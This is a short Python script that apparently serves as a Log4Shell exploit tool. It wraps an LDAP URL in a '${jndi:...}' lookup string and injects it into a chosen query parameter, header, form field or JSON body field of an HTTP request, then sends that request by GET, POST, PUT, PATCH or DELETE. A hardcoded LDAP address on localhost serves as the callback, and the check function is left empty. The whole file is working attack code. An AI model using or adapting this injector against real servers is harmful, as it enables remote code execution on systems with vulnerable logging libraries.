from typing import Any, Dict, Literal
from dataclasses import dataclass
import requests
import json


@dataclass
class ExploitConfig:
    ldap_query: str
    target_payload: str
    target_key: str

@dataclass
class Request:
    url: str
    headers: Dict[str, Any]
    querys: Dict[str, Any]
    datas: Dict[str, Any]
    method: Literal["get", "post", "put", "patch", "delete"]
    payload_method: Literal["json", "form"]


def exploit(request: Request, config: ExploitConfig):
    jndi = "${jndi:" + config.ldap_query + "}"

    querys = request.querys.copy()
    headers = request.headers.copy()
    datas = request.datas.copy()

    match config.target_payload:
        case "query":
            querys[config.target_key] = jndi
        case "header":
            headers[config.target_key] = jndi
        case "form":
            datas[config.target_key] = jndi
        case "json":
            datas[config.target_key] = jndi

    match request.method:
        case "get":
            requests.get(request.url, params=querys, headers=headers)
        case "post":
            match request.payload_method:
                case "json":
                    requests.post(request.url, params=querys, headers=headers, data=json.dumps(datas))
                case "form":
                    requests.post(request.url, params=querys, headers=headers, data=datas)
        case "put":
            match request.payload_method:
                case "json":
                    requests.put(request.url, params=querys, headers=headers, data=json.dumps(datas))
                case "form":
                    requests.put(request.url, params=querys, headers=headers, data=datas)
        case "patch":
            match request.payload_method:
                case "json":
                    requests.patch(request.url, params=querys, headers=headers, data=json.dumps(datas))
                case "form":
                    requests.patch(request.url, params=querys, headers=headers, data=datas)
        case "delete":
            requests.delete(request.url, params=querys, headers=headers)

def check_exploit(check_url: str):
    pass

def run_exploit(request: Request, target_payload: str, target_key: str):
    config = ExploitConfig("ldap://localhost:1389/uid=exploit,ou=people,dc=example,dc=com", target_payload, target_key)
    exploit(request=request, config=config)
